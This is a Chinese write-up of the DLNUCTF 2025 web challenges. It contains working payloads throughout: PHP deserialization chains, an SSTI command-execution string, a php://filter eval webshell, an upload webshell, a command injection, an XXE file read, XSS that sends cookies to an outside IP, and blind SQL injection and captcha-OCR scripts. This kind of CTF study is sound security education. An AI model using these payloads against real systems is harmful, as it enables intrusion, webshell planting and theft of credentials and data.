---
title: DLNUCTF 2025
date: 2026-08-15 08:35:00
categories:
  - CTF wp
tags:
  - CTF
  - DLNUCTF
disableNunjucks: true
description: DLNUCTF 2025
---


## Ez_Poper

题目给出源码

 

```php
<?php
error_reporting(0);

class phone {
    public $track;
    
    public function __get($name) {
        echo "想去哪就去哪<br>";
        $this->track->anyMethod();
    }

    public function __toString() {
        $status = rand(0, 1) ? "online" : "offline";
        isset($this->jack->day);
        return $status;
    }
}

class Jack {
    public $game;
    public $money;
    public $time;
    private $day;
    public function __isset($name) {
        echo "一刀999";
        $this->game->GM=9999999;
        return true;
    }

    public function startGame($title) {
        return $title;
    }
    public function __destruct() {
        echo "GoodBye World!";
        if($this->money == $this->time){
            echo "先来个648";
        }
    }
}

class sun {
    public $warm;
    public function __invoke($param) {
        echo "太阳出来了";
        $this->warm->DoAgain();
    }
    public function __call($name, $arguments) {
         $safe_methods = ['info', 'status'];
    if (in_array($name, $safe_methods)) {
        echo "Calling safe method '$name' with arguments: " . json_encode($arguments);
    } else {
        echo "Method '$name' does not exist. Only safe methods allowed: " . implode(', ', $safe_methods);
    }
        echo "Method $name does not exist";

    }

}

class road{

    public function DoAgain(){
        $this->hahaha();
    }

    public function hahaha(){
        array_walk($this, function($yes, $no) {
            $judege = new $no($yes);
            foreach($judege as $answer){
                echo $answer.'<br>';
            }
        });
    }

    public function repair($days) {
        $this->status = "repaired";
        $this->history[] = "Repaired in $days days";
        return "Road repaired in $days days. Current status: {$this->status}";
    }
}

class night {
    public $auth;
    public $cookie;

    private $isSleeping = false;
    private $sleepHours = 0;

    public function DoAgain() {

        if ($this->auth === $this->cookie) {
            echo "Give you Flag";
        } else {
            echo "Auth mismatch, cannot give Flag";
        }
    }

    public function sleepTime($hours) {
        if ($hours <= 0) {
            return "Cannot sleep for zero or negative hours";
        }

        $this->isSleeping = true;
        $this->sleepHours = $hours;

        $message = "Sleeping for $hours hours";

        if ($hours >= 8) {
            $message .= " — That's a long healthy sleep!";
        } elseif ($hours >= 5) {
            $message .= " — Just enough to recharge.";
        } else {
            $message .= " — Might be too short to feel rested.";
        }

        return $message;
    }

    public function wakeUp() {
        if ($this->isSleeping) {
            $this->isSleeping = false;
            $hours = $this->sleepHours;
            $this->sleepHours = 0;
            return "Woke up after $hours hours of sleep. Feeling refreshed!";
        } else {
            return "Not sleeping currently.";
        }
    }
}


class play {
    public $affair;
    private $currentGame = null;
    private $history = [];

    public function startPlay($game) {
        $this->currentGame = $game;
        $this->history[] = "Started playing $game at " . date('H:i:s');
        return "Now playing: $game";
    }

    public function __call($name, $args) {
        ($this->affair)("param");
    }

    public function endPlay() {
        if ($this->currentGame) {
            $this->history[] = "Ended playing {$this->currentGame} at " . date('H:i:s');
            $endedGame = $this->currentGame;
            $this->currentGame = null;
            return "Finished playing: $endedGame";
        } else {
            return "No game is currently being played";
        }
    }

    public function getHistory() {
        return $this->history;
    }
}



if($_POST['pop']){
    if ((string)md5($fl=$_GET['fl']) === (string)md5($ag=$_GET['ag']) && $fl !== $ag) {
    echo "Go Go Go";
    unserialize($_POST['pop']);}
}
else{
    highlight_file(__FILE__);
}
?>
```

首先第一步要绕过MD5强比较

```
TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
这2个字符串md5编码后都是 faad49866e9498fc1719f5289e7a0269
```

然后就是搓pop链了

先找到利用点，road类的hahaha方法

```php
public function hahaha(){
        array_walk($this, function($yes, $no) {
            $judege = new $no($yes);
            foreach($judege as $answer){
                echo $answer.'<br>';
            }
        });
    }
```

在其中有`$judege = new $no($yes);`创建任意类，所有可以使用PHP的原生类来进行文件包含和利用

```php
// 构造对象链
$p = new phone();
$pl = new play();
$s = new sun();
$r = new road();

// 串联链条
$p->track = $pl;
$pl->affair = $s;
$s->warm = $r;

// Road 的属性名 = 类名，值 = 参数
//$r->DirectoryIterator = '/';
$r->SplFileObject = '/f1@g';

// 序列化
$a = new Jack();
$a->money = $p;
$a->time = "123";

echo urlencode(serialize($a));
//O%3A4%3A%22Jack%22%3A4%3A%7Bs%3A4%3A%22game%22%3BN%3Bs%3A5%3A%22money%22%3BO%3A5%3A%22phone%22%3A1%3A%7Bs%3A5%3A%22track%22%3BO%3A4%3A%22play%22%3A3%3A%7Bs%3A6%3A%22affair%22%3BO%3A3%3A%22sun%22%3A1%3A%7Bs%3A4%3A%22warm%22%3BO%3A4%3A%22road%22%3A1%3A%7Bs%3A13%3A%22SplFileObject%22%3Bs%3A5%3A%22%2Ff1%40g%22%3B%7D%7Ds%3A17%3A%22%00play%00currentGame%22%3BN%3Bs%3A13%3A%22%00play%00history%22%3Ba%3A0%3A%7B%7D%7D%7Ds%3A4%3A%22time%22%3Bs%3A3%3A%22123%22%3Bs%3A9%3A%22%00Jack%00day%22%3BN%3B%7D
```

![](/img/ctf/dlnuctf-001.png)

## ez_secret

首先抓包发现

![](/img/ctf/dlnuctf-002.png)

在头中不允许出现某些字符，所以我们全部删掉

![](/img/ctf/dlnuctf-003.png)

提示提供url参数

![](/img/ctf/dlnuctf-004.png)

是一个网页快照的功能

探测内网端口

![](/img/ctf/dlnuctf-005.png)

端口在1337端口

然后扫目录发现secret（确实通过题目ez_secret可以猜出

![](/img/ctf/dlnuctf-006.png)

![](/img/ctf/dlnuctf-007.png)

测试参数

![](/img/ctf/dlnuctf-008.png)

发现是一个ssti，我们可以写一个代理，将本地参数url二次编码后发送到服务器，这样我们就可以使用fenjing来一把梭了

```python
from flask import Flask, request, Response
import http.client
import urllib.parse

app = Flask(__name__)

HOST = "111.170.6.21"
PORT = 33069
BASE_PATH = "/?url=http://127.0.0.1:1337/secret?admin="

@app.route("/")
def proxy():
    user_input = request.args.get("id", "")
    # 二次 URL 编码
    encoded = urllib.parse.quote(urllib.parse.quote(user_input, safe=""), safe="")
    path = BASE_PATH + encoded

    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    # 构造最简洁的 GET 请求
    conn.putrequest("GET", path)
    conn.putheader("Host", f"{HOST}:{PORT}")
    conn.endheaders()

    resp = conn.getresponse()
    data = resp.read()
    conn.close()

    return Response(data, status=resp.status, content_type=resp.getheader("Content-Type"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

```

![](/img/ctf/dlnuctf-009.png)

payload

```
{{((ez|attr("%c"%95+"%c"%95+'eq'+"%c"%95+"%c"%95))["%c"%95+"%c"%95+'g''lobals'+"%c"%95+"%c"%95].sys['m''odules']['o''s']['p''open']('ls /'))['r''ead']()}}
```

## Ez_system

在源码中发现账号密码

![](/img/ctf/dlnuctf-010.png)

```
xiaoming
qazplm
```

![](/img/ctf/dlnuctf-011.png)

修改cookie为admin

![](/img/ctf/dlnuctf-012.png)

进入

![](/img/ctf/dlnuctf-013.png)

然后在切换各个功能点时发现始终为dashboard.php

抓包观察

![](/img/ctf/dlnuctf-014.png)

推测应该为文件包含

![](/img/ctf/dlnuctf-015.png)

```php
#/var/www/flag/hahaha.php 源码
<?php
error_reporting(0);

class Bridge {
    public $worker;
    public function __toString(){
        return ($this->worker)();
    }
}

class Loader {
    public $file;
    public $next;
    public function __destruct(){

        if ($this->file && file_get_contents($this->file) === "DLNUCTF2025 is awesome!") {
            $this->next->bridge;
        }
    }
}

class Executor {
    public $result;
    public function exec(){
        return $this->result->FLAG();
    }
}


class Writer {
    public $path;
    public $well;
    public function __invoke(){
        return $this->well->exec();
    }
    public function __call($name, $args){
        if (preg_match('/%|iconv|UCS|UTF|htaccess|quoted|base|zlib|zip|read/i', $this->path)) {
            die("blocked");
        }
        file_put_contents($this->path,'<?php exit();'.$this->path);
    }
}
class Relay {
    public $target;
    public function __get($name){
        echo $this->target;
    }
}

if(isset($_POST['payload'])){
    if(preg_match("/next/i", $_POST['payload'])){
        die("no hack");
    }
    unserialize($_POST['payload']);
}else{
    echo "no";
}
```

依旧pop链

```php
$a = new Loader();
$a->file = "data://text/plain,DLNUCTF2025 is awesome!";
$a->next = new Relay();
$a->next->target = new Bridge();
$a->next->target->worker = new Writer();
$a->next->target->worker->well = new Executor();
$a->next->target->worker->well->result = new Writer();
$a->next->target->worker->well->result->path = "php://filter/write=string.rot13|<?cuc riny(\$_CBFG[0]);?>|/resource=/var/www/html/2.php";



$payload = serialize($a);
echo $payload;
```

payload如下

```
O:6:"Loader":2:{s:4:"file";s:41:"data://text/plain,DLNUCTF2025 is awesome!";s:4:"next";O:5:"Relay":1:{s:6:"target";O:6:"Bridge":1:{s:6:"worker";O:6:"Writer":2:{s:4:"path";N;s:4:"well";O:8:"Executor":1:{s:6:"result";O:6:"Writer":2:{s:4:"path";s:86:"php://filter/write=string.rot13|<?cuc riny($_CBFG[0]);?>|/resource=/var/www/html/2.php";s:4:"well";N;}}}}}}
```

`s:4:"next";`可以使用 `S:4:"nex\74";`绕过

![](/img/ctf/dlnuctf-016.png)

![](/img/ctf/dlnuctf-017.png)

flag文件我们并没有权限去读取，

查看sh文件

```sh
#!/bin/bash
cd /var/www/html/
while :
do
    cp -P * /var/www/html/backup/
    chmod 755 -R /var/www/html/backup/
    sleep 10
    
done
```

这个脚本会每隔10秒中,把`/var/www/html/` 目录下的文件,复制一份到 `/var/www/html/backup/` 中,并且权限设置为 755. 是可读权限.

我们可以利用这个脚本,因为对flag没有权限,所以我们不能直接把它复制到`/var/www/html/` 目录下,但是我们可以创建一个 它的链接(类似快捷方式)的文件.

但是 脚本中的`cp` 执行 是 `-P`参数, 不跟随链接, 就是只会把快捷方式复制过去,而不是指向的flag的内容.我们还是看不到.

### 前置知识

#### cp指令参数

| 选项 | 名称/含义                  | 对命令行参数中的符号链接 | 对目录内部的符号链接   | 备注                   |
| :--- | :------------------------- | :----------------------- | :--------------------- | :--------------------- |
| `-P` | **不跟随** (Preserve link) | **复制链接本身**         | **复制链接本身**       | **通常是默认行为**     |
| `-H` | **仅命令行跟随**           | **复制链接指向的目标**   | **复制链接本身**       | 只对直接列出的源起作用 |
| `-L` | **总是跟随** (Follow link) | **复制链接指向的目标**   | **复制链接指向的目标** | 与 `-P` 行为完全相反   |

```shell
cp -P * /var/www/html/backup/
```

#### `*` 的解析规则（Shell Globbing）

- Shell 会列出**当前目录下所有非隐藏文件和目录**（即不以 `.` 开头的）。
- 然后**按字母顺序排序**，生成一个文件名列表。
- 最后，把 `*` 替换成这个列表，再执行 `cp` 命令。

```css
如果当前目录有：
a.txt
b.txt
file.txt

就会解析成 
cp -P a.txt b.txt file.txt /var/www/html/backup/
```

**如果文件名是 `-` 开头会发生什么？**

➤ **灾难性后果：文件名被当作命令行选项解析！**

根据linux系统命令参数的后来者胜出原则,我们在 -P 后边添加 -H 就会实现跟随链接复制了.
所以,我们可以创建一个名字为 `-H`或者 `-L`的文件,然后再创建 /flag的链接,就可以复制flag的内容了.

![](/img/ctf/dlnuctf-018.png)

## ez_upload

非常基础的文件上传

`.htaccess`

```
AddType application/x-httpd-php .jpg
```

`1.jpg`

```
<?=call_user_func($_POST[1],$_POST[0]);
```

![](/img/ctf/dlnuctf-019.png)

## File_Search_Portal

简简单单扫个目录

![](/img/ctf/dlnuctf-020.png)

发现git泄露

![](/img/ctf/dlnuctf-021.png)

index2.php源码

```php
<?php
    $validKey = "s3cr3tK3y";

    if($_SERVER["REQUEST_METHOD"] != "POST"){
    http_response_code(404);
    echo "404 Not Found";
    } else {
        $data = json_decode(file_get_contents("php://input"));


        if (!isset($data->key) || $data->key !== $validKey) {
            echo json_encode(["Invalid Key"]);
            exit();
        }

        if (strpos($data->target, "&") !== false || strpos($data->target, "$") !== false){
            echo json_encode(["Invalid Character"]);
            exit();
        }
        $query = exec("find ../../../files/* -iname \"*$data->target*\" | xargs");
        if (strlen($query) < 1){
            echo json_encode(["No file returned"]);
        } else {
            $queryArr = explode(" ", $query);
            foreach($queryArr as $key => $tmp){
                $queryArr[$key] = str_replace("../../../files/", "", $tmp);
            }
            echo json_encode($queryArr);
        }
    }
?>

```

或取到key，并且使用字符串拼接，导致命令注入

![](/img/ctf/dlnuctf-022.png)

payload

```json
{"key":"s3cr3tK3y","target":"abc\" | cat /f* > 1.txt #"}
```

## just_a_login

是一个登陆，并且有验证码

先手动测试一下是否存在sql注入

![](/img/ctf/dlnuctf-023.png)

![](/img/ctf/dlnuctf-024.png)

存在sql注入

抓包发现数据包被加密

![](/img/ctf/dlnuctf-025.png)

大概测了测发现没有waf，并且为sqllite数据库

发现存在真假两个页面

![](/img/ctf/dlnuctf-026.png)

![](/img/ctf/dlnuctf-027.png)

使用bool盲注

```python
import requests
import cv2
import numpy as np
from PIL import Image
import pytesseract
import time, random, base64

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization

# ===== 公钥 (和 encrypt.js 一致) =====
PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs9uXBWkw5j/51MsXmog2
3kzQl+CYU6XTly2eJf+0l4QMYwRzNaDvLrGLmxKe+3Ck3zUPEftveRFPLKGZJHVN
Hfqphj1G94tbhIFe6p/MWNahR9aSDW4VUILhNglt9wCisGjTBkwGG8xB6ch3ggtf
46cEEfVoWd9Q522TSZdMsHWWfYOJXg5YZU9ZpOt26Jb5aD4IpD4FpW6MrRUgiGRX
s3AQvLusQW4TC4SvHnhygLk4mkNJi+COUElKd7khgF/u1xxB9rhX8/dpOhlAXdhT
MxwnJrqE4bbmCQxGoWm6N3Lxq6CQDK0OHAkz/UaMnd6zKsxGcvFS/FrOTxTdIEV1
sQIDAQAB
-----END PUBLIC KEY-----"""

# ===== RSA 加密 =====
def rsa_encrypt_password(password: str) -> str:
    public_key = serialization.load_pem_public_key(PUBLIC_KEY_PEM)
    ciphertext = public_key.encrypt(
        password.encode("utf-8"),
        padding.PKCS1v15()
    )
    return base64.b64encode(ciphertext).decode()

# ===== 获取验证码 + OCR =====
def get_captcha_text(session, base_url):
    while True:
        url = f"{base_url}/captcha?{int(time.time()*1000)+random.randint(0,999)}"
        resp = session.get(url)
        if resp.status_code != 200:
            continue  # 网络问题重试

        # 刷新 cookie
        if "Set-Cookie" in resp.headers:
            session.cookies.update(resp.cookies)

        img_array = np.frombuffer(resp.content, np.uint8)
        img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        _, th = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)

        pil = Image.fromarray(255 - th)  # 黑字白底
        text = pytesseract.image_to_string(
            pil, config="-c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 --psm 7"
        )
        text = text.strip()
        if len(text) == 4:  # 只要 OCR 出 4 位
            return text

# ===== 主逻辑 =====
def main():
    base_url = "http://111.170.6.21:33552"
    password = "1' OR 1=2-- "

    encrypted_pwd = rsa_encrypt_password(password)
    print(f"[*] 密码: {password}") 

    while True:  # 当前密码循环直到验证码正确或登录成功
        session = requests.Session()  # 每次新建会话，确保 cookie 新鲜
        captcha = get_captcha_text(session, base_url)
        print(f"    识别验证码: {captcha}")

        payload = {
            "password_plain": "admin",
            "password_encrypted": encrypted_pwd,
            "captcha": captcha
        }

        resp = session.post(f"{base_url}/login", data=payload)

        if "验证码错误" in resp.text:  # OCR 错了
            print("    [-] 验证码错误，重试...")
            continue  # 同一密码，刷新验证码重试
        
        print(resp.text)
        break

if __name__ == "__main__":
    main()
```

## no_happy

在fuzz时发现传参`index`发现没有回显

猜测后端为一个文件包含，发现过滤了php，并且会在最后加上php后缀，由于是json格式的参数，尝试unicode编码绕过

![](/img/ctf/dlnuctf-028.png)读取到源码

![](/img/ctf/dlnuctf-029.png)

读取roko0oo0090_se3ret.php

![](/img/ctf/dlnuctf-030.png)

访问

![](/img/ctf/dlnuctf-031.png)

是一个没有任何过滤的xxe

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
		<!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<x>&xxe;</x>
```

![](/img/ctf/dlnuctf-032.png)

## Resume

给出源码

```js
app.post('/', (req, res) => {
  let { content } = req.body;
  //  content = content.slice(0, 150);
  if (content) {

    content = sanitizeHtml(content, {
      allowedTags: ['div', 'span', 'b', 'i', 'u', 'a', 'img'],
      allowedAttributes: {
        div: ['data-content'],
        a: ['href'],
        img: ['src'],
        span: ['style'],
      },
      allowedSchemes: ['http', 'https'],
      disallowedTagsMode: 'discard',
      transformTags: {
        '*': (tagName, attribs) => {
          const filteredAttribs = {};
          for (const key in attribs) {
            if (!key.startsWith('on') && !attribs[key].match(/(fetch|alert|eval|javascript:)/i)) {
              filteredAttribs[key] = attribs[key];
            }
          }
          return { tagName, attribs: filteredAttribs };
        }
      }
    });
    const content2=Buffer.from(content).toString("ascii");
    xssStorage.push(content2);
    console.log(`[+] Stored resume content: ${content}`);
  }
  res.redirect('/view');
});
```

我们可以发现这过滤的非常死

不难发现有一行代码

```js
const content2=Buffer.from(content).toString("ascii");
xssStorage.push(content2);
```

题目是先检查，然后将输入转换为ascii码再保存

所以我们可以使用特殊字符来绕过检查，在保存时保存我们的恶意代码

参考文章:

[0224: Love Letter | Intigriti Monthly Challenges](https://bugology.intigriti.io/intigriti-monthly-challenges/0224)

[Intigriti's XSS Challenge (February 2024) :: Mystify](https://mystiz.hk/posts/2024/2024-02-23-intigriti-xss/)



放两个payload，任意一个都行

```
⸼img src=x onerror="fetch('http://47.xxx.xxx.xxx/?id=' + document.cookie)" id=⣾
偼script 偾fetch('http://47.xxx.xxx.xxx/?id=' + document.cookie) //偼/script 偾
```



![](/img/ctf/dlnuctf-033.png)

## 抓马的网页

从题目可以看出，其实首页已经被上马了

而webshell密码都是post传参

目前测出了几个密码

```
cmd
code
```

蚁剑连就行了

![](/img/ctf/dlnuctf-034.png)

![](/img/ctf/dlnuctf-035.png)

发现权限不够

在查看计时任务发现一个sh脚本（还有一个蚁剑插件绕disable_function）

![](/img/ctf/dlnuctf-036.png)

去查看文件

echo "<?php @eval(\$_POST['a']); ?>">>24.php

发现以root用户运行了一个sh脚本

![](/img/ctf/dlnuctf-037.png)

并且我们可以去修改该sh脚本

![](/img/ctf/dlnuctf-038.png)

过一会就可以读文件了

![](/img/ctf/dlnuctf-039.png)

## 登陆就送

首先在userid发现了sql注入漏洞

![](/img/ctf/dlnuctf-040.png)

发现没有禁用`extractvalue`

![](/img/ctf/dlnuctf-041.png)

扫目录得到表结构，直接拿数据

![](/img/ctf/dlnuctf-042.png)

![](/img/ctf/dlnuctf-043.png)

## 登录不送了。

和上题一样首先在userid发现了sql注入漏洞，并知道了表结构

![](/img/ctf/dlnuctf-044.png)

一通测试发现

报错被禁完了

注释还剩`--+`（如果被静完了还可以`AND '1'='1`）

 没有真假两个页面

所以只剩下时间盲注

时间盲注在一通测试后发现可以使用笛卡尔积来延时

并且发现ascii被禁，所以我们使用char来将我们的数字转换为字母来进行判断

但是又有一个小知识点**MySQL 默认字符集比较是大小写不敏感的**

- `CHAR` / `VARCHAR` 字段默认使用 `utf8_general_ci` 或其他 `_ci` 结尾的字符集。
- `_ci` 意思是 **Case Insensitive（大小写不敏感）**。
- 所以 `'U' = 'u'` 返回 `TRUE`。

所以在 SQL语句 中用 `BINARY` 强制区分大小写

以下为测试payload

```
1'and if(1=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)--+
1'and if(1=2,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)--+
```

第一个成功延时，第二个没有

编写脚本(由于密码被base64了，所以我们直接用base64表中的字符就好了，以至于下划线是通过登陆就送知道用户名中有一个下划线)

```python
import requests
import time

url = "http://111.170.6.21:33507/login.php"

database_name = ""


for i in range(1, 100):
    char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_+/="
    for j in char:
        payload = f"1'and if(BINARY(substr((SELECT password FROM users LIMIT 0,1),{i},1))=char({ord(j)}),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0) AND '1'='1"
        data = {
            "userid": payload,
            "password": "1"
        }
        start_time = time.time()
        print("当前测试字符:" + j)
        response = requests.post(url,data).text
        end_time = time.time()
        use_time = end_time - start_time

        if use_time >= 6:
            database_name += j
            print(database_name)
            break

```

